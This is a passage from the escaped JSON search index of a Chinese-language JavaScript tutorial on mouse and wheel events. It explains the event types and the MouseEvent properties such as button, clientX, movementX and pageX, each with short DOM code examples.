\u4e0b\u9762\u7684\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 WheelEvent.deltaX \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u6c34\u5e73\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaY \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684\u5782\u76f4\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaZ \uff1a\u6570\u503c\uff0c\u8868\u793a\u6eda\u8f6e\u7684 Z \u8f74\u6eda\u52a8\u91cf\u3002 WheelEvent.deltaMode \uff1a\u6570\u503c\uff0c\u8868\u793a\u4e0a\u9762\u4e09\u4e2a\u5c5e\u6027\u7684\u5355\u4f4d\uff0c 0 \u662f\u50cf\u7d20\uff0c 1 \u662f\u884c\uff0c 2 \u662f\u9875\u3002","title":"\u9f20\u6807\u4e8b\u4ef6"},{"location":"events/mouse/#_1","text":"","title":"\u9f20\u6807\u4e8b\u4ef6"},{"location":"events/mouse/#_2","text":"\u9f20\u6807\u4e8b\u4ef6\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u4e9b\uff0c\u6240\u6709\u4e8b\u4ef6\u90fd\u7ee7\u627f\u4e86 MouseEvent \u63a5\u53e3\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 \uff081\uff09\u70b9\u51fb\u4e8b\u4ef6 \u9f20\u6807\u70b9\u51fb\u76f8\u5173\u7684\u6709\u56db\u4e2a\u4e8b\u4ef6\u3002 click \uff1a\u6309\u4e0b\u9f20\u6807\uff08\u901a\u5e38\u662f\u6309\u4e0b\u4e3b\u6309\u94ae\uff09\u65f6\u89e6\u53d1\u3002 dblclick \uff1a\u5728\u540c\u4e00\u4e2a\u5143\u7d20\u4e0a\u53cc\u51fb\u9f20\u6807\u65f6\u89e6\u53d1\u3002 mousedown \uff1a\u6309\u4e0b\u9f20\u6807\u952e\u65f6\u89e6\u53d1\u3002 mouseup \uff1a\u91ca\u653e\u6309\u4e0b\u7684\u9f20\u6807\u952e\u65f6\u89e6\u53d1\u3002 click \u4e8b\u4ef6\u53ef\u4ee5\u770b\u6210\u662f\u4e24\u4e2a\u4e8b\u4ef6\u7ec4\u6210\u7684\uff1a\u7528\u6237\u5728\u540c\u4e00\u4e2a\u4f4d\u7f6e\u5148\u89e6\u53d1 mousedown \uff0c\u518d\u89e6\u53d1 mouseup \u3002\u56e0\u6b64\uff0c\u89e6\u53d1\u987a\u5e8f\u662f\uff0c mousedown \u9996\u5148\u89e6\u53d1\uff0c mouseup \u63a5\u7740\u89e6\u53d1\uff0c click \u6700\u540e\u89e6\u53d1\u3002 \u53cc\u51fb\u65f6\uff0c dblclick \u4e8b\u4ef6\u5219\u4f1a\u5728 mousedown \u3001 mouseup \u3001 click \u4e4b\u540e\u89e6\u53d1\u3002 \uff082\uff09\u79fb\u52a8\u4e8b\u4ef6 \u9f20\u6807\u79fb\u52a8\u76f8\u5173\u7684\u6709\u4e94\u4e2a\u4e8b\u4ef6\u3002 mousemove \uff1a\u5f53\u9f20\u6807\u5728\u4e00\u4e2a\u8282\u70b9\u5185\u90e8\u79fb\u52a8\u65f6\u89e6\u53d1\u3002\u5f53\u9f20\u6807\u6301\u7eed\u79fb\u52a8\u65f6\uff0c\u8be5\u4e8b\u4ef6\u4f1a\u8fde\u7eed\u89e6\u53d1\u3002\u4e3a\u4e86\u907f\u514d\u6027\u80fd\u95ee\u9898\uff0c\u5efa\u8bae\u5bf9\u8be5\u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u505a\u4e00\u4e9b\u9650\u5b9a\uff0c\u6bd4\u5982\u9650\u5b9a\u4e00\u6bb5\u65f6\u95f4\u5185\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\u3002 mouseenter \uff1a\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u8fdb\u5165\u5b50\u8282\u70b9\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseover \uff1a\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u8fdb\u5165\u5b50\u8282\u70b9\u4f1a\u518d\u4e00\u6b21\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseout \uff1a\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u79bb\u5f00\u7236\u8282\u70b9\u4e5f\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseleave \uff1a\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\uff0c\u79bb\u5f00\u7236\u8282\u70b9\u4e0d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff08\u8be6\u89c1\u540e\u6587\uff09\u3002 mouseover \u4e8b\u4ef6\u548c mouseenter \u4e8b\u4ef6\uff0c\u90fd\u662f\u9f20\u6807\u8fdb\u5165\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\uff0c mouseenter \u4e8b\u4ef6\u53ea\u89e6\u53d1\u4e00\u6b21\uff0c\u800c\u53ea\u8981\u9f20\u6807\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0c mouseover \u4e8b\u4ef6\u4f1a\u5728\u5b50\u8282\u70b9\u4e0a\u89e6\u53d1\u591a\u6b21\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <ul> <li>item 1</li> <li>item 2</li> <li>item 3</li> </ul> */ var ul = document . querySelector ( 'ul' ); // \u8fdb\u5165 ul \u8282\u70b9\u4ee5\u540e\uff0cmouseenter \u4e8b\u4ef6\u53ea\u4f1a\u89e6\u53d1\u4e00\u6b21 // \u4ee5\u540e\u53ea\u8981\u9f20\u6807\u5728\u8282\u70b9\u5185\u79fb\u52a8\uff0c\u90fd\u4e0d\u4f1a\u518d\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6 // event.target \u662f ul \u8282\u70b9 ul . addEventListener ( 'mouseenter' , function ( event ) { event . target . style . color = 'purple' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); // \u8fdb\u5165 ul \u8282\u70b9\u4ee5\u540e\uff0c\u53ea\u8981\u5728\u5b50\u8282\u70b9\u4e0a\u79fb\u52a8\uff0cmouseover \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21 // event.target \u662f li \u8282\u70b9 ul . addEventListener ( 'mouseover' , function ( event ) { event . target . style . color = 'orange' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u7236\u8282\u70b9\u5185\u90e8\u8fdb\u5165\u5b50\u8282\u70b9\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseenter \u4e8b\u4ef6\uff0c\u4f46\u662f\u4f1a\u89e6\u53d1 mouseover \u4e8b\u4ef6\u3002 mouseout \u4e8b\u4ef6\u548c mouseleave \u4e8b\u4ef6\uff0c\u90fd\u662f\u9f20\u6807\u79bb\u5f00\u4e00\u4e2a\u8282\u70b9\u65f6\u89e6\u53d1\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\uff0c\u5728\u7236\u5143\u7d20\u5185\u90e8\u79bb\u5f00\u4e00\u4e2a\u5b50\u5143\u7d20\u65f6\uff0c mouseleave \u4e8b\u4ef6\u4e0d\u4f1a\u89e6\u53d1\uff0c\u800c mouseout \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 /* HTML \u4ee3\u7801\u5982\u4e0b <ul> <li>item 1</li> <li>item 2</li> <li>item 3</li> </ul> */ var ul = document . querySelector ( 'ul' ); // \u5148\u8fdb\u5165 ul \u8282\u70b9\uff0c\u7136\u540e\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseleave \u4e8b\u4ef6 // \u53ea\u6709\u79bb\u5f00 ul \u8282\u70b9\u65f6\uff0c\u89e6\u53d1\u4e00\u6b21 mouseleave // event.target \u662f ul \u8282\u70b9 ul . addEventListener ( 'mouseleave' , function ( event ) { event . target . style . color = 'purple' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); // \u5148\u8fdb\u5165 ul \u8282\u70b9\uff0c\u7136\u540e\u5728\u8282\u70b9\u5185\u90e8\u79fb\u52a8\uff0cmouseout \u4e8b\u4ef6\u4f1a\u89e6\u53d1\u591a\u6b21 // event.target \u662f li \u8282\u70b9 ul . addEventListener ( 'mouseout' , function ( event ) { event . target . style . color = 'orange' ; setTimeout ( function () { event . target . style . color = '' ; }, 500 ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5728\u7236\u8282\u70b9\u5185\u90e8\u79bb\u5f00\u5b50\u8282\u70b9\uff0c\u4e0d\u4f1a\u89e6\u53d1 mouseleave \u4e8b\u4ef6\uff0c\u4f46\u662f\u4f1a\u89e6\u53d1 mouseout \u4e8b\u4ef6\u3002 \uff083\uff09\u5176\u4ed6\u4e8b\u4ef6 contextmenu \uff1a\u6309\u4e0b\u9f20\u6807\u53f3\u952e\u65f6\uff08\u4e0a\u4e0b\u6587\u83dc\u5355\u51fa\u73b0\u524d\uff09\u89e6\u53d1\uff0c\u6216\u8005\u6309\u4e0b\u201c\u4e0a\u4e0b\u6587\u201d\u83dc\u5355\u952e\u65f6\u89e6\u53d1\u3002 wheel \uff1a\u6eda\u52a8\u9f20\u6807\u7684\u6eda\u8f6e\u65f6\u89e6\u53d1\uff0c\u8be5\u4e8b\u4ef6\u7ee7\u627f\u7684\u662f WheelEvent \u63a5\u53e3\u3002","title":"\u9f20\u6807\u4e8b\u4ef6\u7684\u79cd\u7c7b"},{"location":"events/mouse/#mouseevent","text":"MouseEvent \u63a5\u53e3\u4ee3\u8868\u4e86\u9f20\u6807\u76f8\u5173\u7684\u4e8b\u4ef6\uff0c\u5355\u51fb\uff08click\uff09\u3001\u53cc\u51fb\uff08dblclick\uff09\u3001\u677e\u5f00\u9f20\u6807\u952e\uff08mouseup\uff09\u3001\u6309\u4e0b\u9f20\u6807\u952e\uff08mousedown\uff09\u7b49\u52a8\u4f5c\uff0c\u6240\u4ea7\u751f\u7684\u4e8b\u4ef6\u5bf9\u8c61\u90fd\u662f MouseEvent \u5b9e\u4f8b\u3002\u6b64\u5916\uff0c\u6eda\u8f6e\u4e8b\u4ef6\u548c\u62d6\u62c9\u4e8b\u4ef6\u4e5f\u662f MouseEvent \u5b9e\u4f8b\u3002 MouseEvent \u63a5\u53e3\u7ee7\u627f\u4e86 Event \u63a5\u53e3\uff0c\u6240\u4ee5\u62e5\u6709 Event \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5e76\u4e14\u8fd8\u63d0\u4f9b\u9f20\u6807\u72ec\u6709\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b\u4e00\u4e2a MouseEvent() \u6784\u9020\u51fd\u6570\uff0c\u7528\u4e8e\u65b0\u5efa\u4e00\u4e2a MouseEvent \u5b9e\u4f8b\u3002 1 var event = new MouseEvent ( type , options ); MouseEvent() \u6784\u9020\u51fd\u6570\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\u3002\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u4e8b\u4ef6\u540d\u79f0\uff1b\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u4e8b\u4ef6\u914d\u7f6e\u5bf9\u8c61\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u9664\u4e86 Event \u63a5\u53e3\u7684\u5b9e\u4f8b\u914d\u7f6e\u5c5e\u6027\uff0c\u8be5\u5bf9\u8c61\u53ef\u4ee5\u914d\u7f6e\u4ee5\u4e0b\u5c5e\u6027\uff0c\u6240\u6709\u5c5e\u6027\u90fd\u662f\u53ef\u9009\u7684\u3002 screenX \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a0\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u4e0d\u4f1a\u79fb\u52a8\u9f20\u6807\u3002 screenY \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u4e0e screenX \u76f8\u540c\u3002 clientX \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u7a0b\u5e8f\u7a97\u53e3\u7684\u6c34\u5e73\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u9ed8\u8ba4\u503c\u4e3a0\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u4e0d\u4f1a\u79fb\u52a8\u9f20\u6807\u3002 clientY \uff1a\u6570\u503c\uff0c\u9f20\u6807\u76f8\u5bf9\u4e8e\u7a0b\u5e8f\u7a97\u53e3\u7684\u5782\u76f4\u4f4d\u7f6e\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u4e0e clientX \u76f8\u540c\u3002 ctrlKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b\u4e86 Ctrl \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 shiftKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b\u4e86 Shift \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 altKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b Alt \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 metaKey \uff1a\u5e03\u5c14\u503c\uff0c\u662f\u5426\u540c\u65f6\u6309\u4e0b Meta \u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a false \u3002 button \uff1a\u6570\u503c\uff0c\u8868\u793a\u6309\u4e0b\u4e86\u54ea\u4e00\u4e2a\u9f20\u6807\u6309\u952e\uff0c\u9ed8\u8ba4\u503c\u4e3a 0 \uff0c\u8868\u793a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u5de6\u952e\uff09\u6216\u8005\u5f53\u524d\u4e8b\u4ef6\u6ca1\u6709\u5b9a\u4e49\u8fd9\u4e2a\u5c5e\u6027\uff1b 1 \u8868\u793a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u4e2d\u95f4\u952e\uff09\uff0c 2 \u8868\u793a\u6309\u4e0b\u6b21\u8981\u952e\uff08\u901a\u5e38\u662f\u9f20\u6807\u7684\u53f3\u952e\uff09\u3002 buttons \uff1a\u6570\u503c\uff0c\u8868\u793a\u6309\u4e0b\u4e86\u9f20\u6807\u7684\u54ea\u4e9b\u952e\uff0c\u662f\u4e00\u4e2a\u4e09\u4e2a\u6bd4\u7279\u4f4d\u7684\u4e8c\u8fdb\u5236\u503c\uff0c\u9ed8\u8ba4\u4e3a 0 \uff08\u6ca1\u6709\u6309\u4e0b\u4efb\u4f55\u952e\uff09\u3002 1 \uff08\u4e8c\u8fdb\u5236 001 \uff09\u8868\u793a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u5de6\u952e\uff09\uff0c 2 \uff08\u4e8c\u8fdb\u5236 010 \uff09\u8868\u793a\u6309\u4e0b\u6b21\u8981\u952e\uff08\u901a\u5e38\u662f\u53f3\u952e\uff09\uff0c 4 \uff08\u4e8c\u8fdb\u5236 100 \uff09\u8868\u793a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u4e2d\u95f4\u952e\uff09\u3002\u56e0\u6b64\uff0c\u5982\u679c\u8fd4\u56de 3 \uff08\u4e8c\u8fdb\u5236 011 \uff09\u5c31\u8868\u793a\u540c\u65f6\u6309\u4e0b\u4e86\u5de6\u952e\u548c\u53f3\u952e\u3002 relatedTarget \uff1a\u8282\u70b9\u5bf9\u8c61\uff0c\u8868\u793a\u4e8b\u4ef6\u7684\u76f8\u5173\u8282\u70b9\uff0c\u9ed8\u8ba4\u4e3a null \u3002 mouseenter \u548c mouseover \u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u521a\u521a\u79bb\u5f00\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\uff1b mouseout \u548c mouseleave \u4e8b\u4ef6\u65f6\uff0c\u8868\u793a\u9f20\u6807\u6b63\u5728\u8fdb\u5165\u7684\u90a3\u4e2a\u5143\u7d20\u8282\u70b9\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 function simulateClick () { var event = new MouseEvent ( 'click' , { 'bubbles' : true , 'cancelable' : true }); var cb = document . getElementById ( 'checkbox' ); cb . dispatchEvent ( event ); } \u4e0a\u9762\u4ee3\u7801\u751f\u6210\u4e00\u4e2a\u9f20\u6807\u70b9\u51fb\u4e8b\u4ef6\uff0c\u5e76\u89e6\u53d1\u8be5\u4e8b\u4ef6\u3002","title":"MouseEvent \u63a5\u53e3"},{"location":"events/mouse/#mouseevent_1","text":"","title":"MouseEvent \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027"},{"location":"events/mouse/#mouseeventaltkeymouseeventctrlkeymouseeventmetakeymouseeventshiftkey","text":"MouseEvent.altKey \u3001 MouseEvent.ctrlKey \u3001 MouseEvent.metaKey \u3001 MouseEvent.shiftKey \u8fd9\u56db\u4e2a\u5c5e\u6027\u90fd\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u662f\u5426\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002\u5b83\u4eec\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 altKey \u5c5e\u6027\uff1aAlt \u952e ctrlKey \u5c5e\u6027\uff1aCtrl \u952e metaKey \u5c5e\u6027\uff1aMeta \u952e\uff08Mac \u952e\u76d8\u662f\u4e00\u4e2a\u56db\u74e3\u7684\u5c0f\u82b1\uff0cWindows \u952e\u76d8\u662f Windows \u952e\uff09 shiftKey \u5c5e\u6027\uff1aShift \u952e 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <body onclick=\"showKey(event)\"> function showKey ( e ) { console . log ( 'ALT key pressed: ' + e . altKey ); console . log ( 'CTRL key pressed: ' + e . ctrlKey ); console . log ( 'META key pressed: ' + e . metaKey ); console . log ( 'SHIFT key pressed: ' + e . shiftKey ); } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u70b9\u51fb\u7f51\u9875\u4f1a\u8f93\u51fa\u662f\u5426\u540c\u65f6\u6309\u4e0b\u5bf9\u5e94\u7684\u952e\u3002","title":"MouseEvent.altKey\uff0cMouseEvent.ctrlKey\uff0cMouseEvent.metaKey\uff0cMouseEvent.shiftKey"},{"location":"events/mouse/#mouseeventbuttonmouseeventbuttons","text":"MouseEvent.button \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6570\u503c\uff0c\u8868\u793a\u4e8b\u4ef6\u53d1\u751f\u65f6\u6309\u4e0b\u4e86\u9f20\u6807\u7684\u54ea\u4e2a\u952e\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 0\uff1a\u6309\u4e0b\u4e3b\u952e\uff08\u901a\u5e38\u662f\u5de6\u952e\uff09\uff0c\u6216\u8005\u8be5\u4e8b\u4ef6\u6ca1\u6709\u521d\u59cb\u5316\u8fd9\u4e2a\u5c5e\u6027\uff08\u6bd4\u5982 mousemove \u4e8b\u4ef6\uff09\u3002 1\uff1a\u6309\u4e0b\u8f85\u52a9\u952e\uff08\u901a\u5e38\u662f\u4e2d\u952e\u6216\u8005\u6eda\u8f6e\u952e\uff09\u3002 2\uff1a\u6309\u4e0b\u6b21\u952e\uff08\u901a\u5e38\u662f\u53f3\u952e\uff09\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u4e3a // <button onmouseup=\"whichButton(event)\">\u70b9\u51fb</button> var whichButton = function ( e ) { switch ( e . button ) { case 0 : console . log ( 'Left button clicked.' ); break ; case 1 : console . log ( 'Middle button clicked.' ); break ; case 2 : console . log ( 'Right button clicked.' ); break ; default : console . log ( 'Unexpected code: ' + e . button ); } } MouseEvent.buttons \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u4e09\u4e2a\u6bd4\u7279\u4f4d\u7684\u503c\uff0c\u8868\u793a\u540c\u65f6\u6309\u4e0b\u4e86\u54ea\u4e9b\u952e\u3002\u5b83\u7528\u6765\u5904\u7406\u540c\u65f6\u6309\u4e0b\u591a\u4e2a\u9f20\u6807\u952e\u7684\u60c5\u51b5\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1\uff1a\u4e8c\u8fdb\u5236\u4e3a 001 \uff08\u5341\u8fdb\u5236\u76841\uff09\uff0c\u8868\u793a\u6309\u4e0b\u5de6\u952e\u3002 2\uff1a\u4e8c\u8fdb\u5236\u4e3a 010 \uff08\u5341\u8fdb\u5236\u76842\uff09\uff0c\u8868\u793a\u6309\u4e0b\u53f3\u952e\u3002 4\uff1a\u4e8c\u8fdb\u5236\u4e3a 100 \uff08\u5341\u8fdb\u5236\u76844\uff09\uff0c\u8868\u793a\u6309\u4e0b\u4e2d\u952e\u6216\u6eda\u8f6e\u952e\u3002 \u540c\u65f6\u6309\u4e0b\u591a\u4e2a\u952e\u7684\u65f6\u5019\uff0c\u6bcf\u4e2a\u6309\u4e0b\u7684\u952e\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u90fd\u4f1a\u6709\u503c\u3002\u6bd4\u5982\uff0c\u540c\u65f6\u6309\u4e0b\u5de6\u952e\u548c\u53f3\u952e\uff0c\u4f1a\u8fd4\u56de3\uff08\u4e8c\u8fdb\u5236\u4e3a011\uff09\u3002","title":"MouseEvent.button\uff0cMouseEvent.buttons"},{"location":"events/mouse/#mouseeventclientxmouseeventclienty","text":"MouseEvent.clientX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u76f8\u5bf9\u4e8e\u6d4f\u89c8\u5668\u7a97\u53e3\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.clientY \u5c5e\u6027\u8fd4\u56de\u5782\u76f4\u5750\u6807\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u4e3a // <body onmousedown=\"showCoords(event)\"> function showCoords ( evt ){ console . log ( 'clientX value: ' + evt . clientX + '\\n' + 'clientY value: ' + evt . clientY + '\\n' ); } \u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd8\u5206\u522b\u6709\u4e00\u4e2a\u522b\u540d MouseEvent.x \u548c MouseEvent.y \u3002","title":"MouseEvent.clientX\uff0cMouseEvent.clientY"},{"location":"events/mouse/#mouseeventmovementxmouseeventmovementy","text":"MouseEvent.movementX \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u4e0e\u4e0a\u4e00\u4e2a mousemove \u4e8b\u4ef6\u4e4b\u95f4\u7684\u6c34\u5e73\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6570\u503c\u4e0a\uff0c\u5b83\u7b49\u4e8e\u4e0b\u9762\u7684\u8ba1\u7b97\u516c\u5f0f\u3002 1 currentEvent . movementX = currentEvent . screenX - previousEvent . screenX MouseEvent.movementY \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u4f4d\u7f6e\u4e0e\u4e0a\u4e00\u4e2a mousemove \u4e8b\u4ef6\u4e4b\u95f4\u7684\u5782\u76f4\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u6570\u503c\u4e0a\uff0c\u5b83\u7b49\u4e8e\u4e0b\u9762\u7684\u8ba1\u7b97\u516c\u5f0f\u3002 1 currentEvent . movementY = currentEvent . screenY - previousEvent . screenY \u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002","title":"MouseEvent.movementX\uff0cMouseEvent.movementY"},{"location":"events/mouse/#mouseeventscreenxmouseeventscreeny","text":"MouseEvent.screenX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u76f8\u5bf9\u4e8e\u5c4f\u5e55\u5de6\u4e0a\u89d2\u7684\u6c34\u5e73\u5750\u6807\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.screenY \u5c5e\u6027\u8fd4\u56de\u5782\u76f4\u5750\u6807\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <body onmousedown=\"showCoords(event)\"> function showCoords ( evt ) { console . log ( 'screenX value: ' + evt . screenX + '\\n' , 'screenY value: ' + evt . screenY + '\\n' ); }","title":"MouseEvent.screenX\uff0cMouseEvent.screenY"},{"location":"events/mouse/#mouseeventoffsetxmouseeventoffsety","text":"MouseEvent.offsetX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u4e0e\u76ee\u6807\u8282\u70b9\u5de6\u4fa7\u7684 padding \u8fb9\u7f18\u7684\u6c34\u5e73\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.offsetY \u5c5e\u6027\u8fd4\u56de\u4e0e\u76ee\u6807\u8282\u70b9\u4e0a\u65b9\u7684 padding \u8fb9\u7f18\u7684\u5782\u76f4\u8ddd\u79bb\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 /* HTML \u4ee3\u7801\u5982\u4e0b <style> p { width: 100px; height: 100px; padding: 100px; } </style> <p>Hello</p> */ var p = document . querySelector ( 'p' ); p . addEventListener ( 'click' , function ( e ) { console . log ( e . offsetX ); console . log ( e . offsetY ); }, false ); \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u9f20\u6807\u5982\u679c\u5728 p \u5143\u7d20\u7684\u4e2d\u5fc3\u4f4d\u7f6e\u70b9\u51fb\uff0c\u4f1a\u8fd4\u56de 150 150 \u3002\u56e0\u6b64\u4e2d\u5fc3\u4f4d\u7f6e\u8ddd\u79bb\u5de6\u4fa7\u548c\u4e0a\u65b9\u7684 padding \u8fb9\u7f18\uff0c\u7b49\u4e8e padding \u7684\u5bbd\u5ea6\uff08100\u50cf\u7d20\uff09\u52a0\u4e0a\u5143\u7d20\u5185\u5bb9\u533a\u57df\u4e00\u534a\u7684\u5bbd\u5ea6\uff0850\u50cf\u7d20\uff09\u3002","title":"MouseEvent.offsetX\uff0cMouseEvent.offsetY"},{"location":"events/mouse/#mouseeventpagexmouseeventpagey","text":"MouseEvent.pageX \u5c5e\u6027\u8fd4\u56de\u9f20\u6807\u4f4d\u7f6e\u4e0e\u6587\u6863\u5de6\u4fa7\u8fb9\u7f18\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c MouseEvent.pageY \u5c5e\u6027\u8fd4\u56de\u4e0e\u6587\u6863\u4e0a\u4fa7\u8fb9\u7f18\u7684\u8ddd\u79bb\uff08\u5355\u4f4d\u50cf\u7d20\uff09\u3002\u5b83\u4eec\u7684\u8fd4\u56de\u503c\u90fd\u5305\u62ec\u6587\u6863\u4e0d\u53ef\u89c1\u7684\u90e8\u5206\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 /* HTML \u4ee3\u7801\u5982\u4e0b <style> body { height: 2000px; } </style> */ document . body . addEventListener ( 'click' , function ( e ) { console . log ( e . pageX ); console . log ( e . pageY ); }, false ); 